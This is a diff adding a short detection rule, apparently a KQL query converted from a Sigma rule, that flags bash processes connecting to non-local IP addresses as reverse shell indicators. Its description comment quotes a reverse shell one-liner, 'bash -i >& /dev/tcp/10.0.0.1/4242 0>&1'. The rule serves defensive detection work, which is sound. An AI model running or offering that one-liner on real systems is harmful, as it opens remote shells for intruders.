@@ -1,0 +1,11 @@
+// Title: Linux Reverse Shell Indicator
+// Author: Florian Roth (Nextron Systems)
+// Date: 2021-10-16
+// Level: critical
+// Description: Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
+// MITRE Tactic: Execution
+// Tags: attack.execution, attack.t1059.004
+// Reference: https://github.com/SigmaHQ/sigma/blob/master/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml
+
+DeviceNetworkEvents
+| where InitiatingProcessFolderPath endswith "/bin/bash" and (not((RemoteIP in~ ("127.0.0.1", "0.0.0.0"))))
